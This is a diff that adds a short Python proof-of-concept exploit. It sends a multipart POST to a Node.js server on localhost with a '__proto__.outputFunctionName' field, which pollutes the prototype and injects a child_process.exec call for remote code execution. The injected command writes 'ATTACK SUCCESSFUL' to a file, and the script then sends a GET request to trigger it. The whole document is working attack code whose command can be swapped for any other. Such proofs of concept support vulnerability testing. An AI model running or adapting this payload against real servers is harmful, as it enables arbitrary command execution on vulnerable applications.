@@ -1,0 +1,17 @@
+import requests
+
+# server url
+target_url = 'http://localhost:8080'
+# rce command, here's an example to write a file
+exec_command = "echo \"ATTACK SUCCESSFUL\" > attacked.txt"
+# will cause prototype pollution
+to_cause_prototype_pollution = {
+    "__proto__.outputFunctionName": (
+        None,
+        f"x;process.mainModule.require('child_process').exec('{exec_command}');x"
+    )
+}
+
+# send request
+requests.post(target_url, files=to_cause_prototype_pollution)
+requests.get(target_url)
